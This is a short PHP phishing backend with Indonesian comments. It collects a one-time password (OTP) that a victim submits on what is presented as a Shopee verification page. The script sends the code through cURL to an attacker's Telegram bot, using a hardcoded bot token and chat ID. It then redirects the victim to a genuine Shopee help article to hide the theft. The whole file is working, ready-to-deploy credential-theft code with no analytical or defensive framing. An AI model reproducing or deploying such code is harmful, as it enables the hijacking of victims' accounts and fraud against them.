<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pin_array = $_POST['pin'];
    $otp_code = implode("", $pin_array);

    // --- PENGATURAN TELEGRAM ---
    $botToken = "8696806794:AAGj5u7uNVr_klxKYA58oxofdsyxfyXc3zM";
    $chatId = "8504237944";
    
    $message = "<b>🔔 OTP Shopee Terdeteksi</b>\n";
    $message .= "<b>Kode:</b> <code>" . $otp_code . "</code>\n";

    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($message) . "&parse_mode=html";
    
    // Kirim data menggunakan cURL (lebih stabil)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // --- OTOMATIS PINDAH KE HALAMAN LAIN ---
    // Ganti URL di bawah dengan tujuan yang diinginkan
    header("Location: https://shopee.co.id/help/article/12345");
    exit();
}
?>